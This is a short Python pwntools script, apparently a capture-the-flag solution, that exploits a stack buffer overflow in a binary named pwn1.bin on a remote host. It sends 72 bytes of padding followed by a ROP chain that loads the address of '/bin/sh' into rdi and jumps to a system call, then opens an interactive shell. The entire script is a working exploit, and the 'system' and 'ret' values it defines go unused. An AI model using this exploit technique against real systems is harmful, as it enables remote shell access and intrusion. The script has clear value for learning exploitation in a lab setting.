from pwn import *
# 设置运行环境的架构、操作系统和日志级别
context(arch="amd64", os="linux", log_level="debug")

# 连接到远程服务器
p = remote("10.12.153.73", 11928)
elf = ELF("./pwn1.bin")  # 加载ELF二进制文件

# 定义需要的ROP链地址
pop_rdi = 0x401c73  # pop rdi; ret
ret = 0x40101a      # ret
binsh = 0x4023ff    # "/bin/sh"字符串的地址
system = elf.sym["system"]  # 获取system函数的地址

# 构造payload
payload = cyclic(64 + 8) + p64(pop_rdi) + p64(binsh) + p64(0x401b21)

# 发送payload到目标程序
p.sendlineafter('wish: ', payload)

# 进入交互模式，保持会话
p.interactive()